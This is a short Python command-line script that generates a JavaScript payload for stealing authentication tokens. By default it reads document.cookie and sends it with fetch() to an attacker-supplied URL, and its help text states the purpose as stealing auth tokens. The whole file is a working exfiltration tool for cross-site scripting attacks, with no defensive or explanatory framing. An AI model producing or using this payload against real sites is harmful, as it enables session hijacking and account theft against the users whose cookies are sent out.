#!/usr/bin/env python3

def generate(url: str, token: str="document.cookie"):
    return "fetch(\"{0}?a=\"+{1})".format(url, token)

if __name__ == "__main__":
    import argparse
    import sys

    parser = argparse.ArgumentParser(description="Generate a javascript script to steam auth tokens")
    parser.add_argument('url',
        nargs="?",
        default=sys.stdin,
        help="The URL to send the token to")
    parser.add_argument('-t',
        "--token", 
        default="document.cookie",
        help="The code to access the token you want")

    args = parser.parse_args()

    if isinstance(args.url, str):
        url = args.url
    else:
        url = args.url.read()

    print(generate(url, token=args.token))

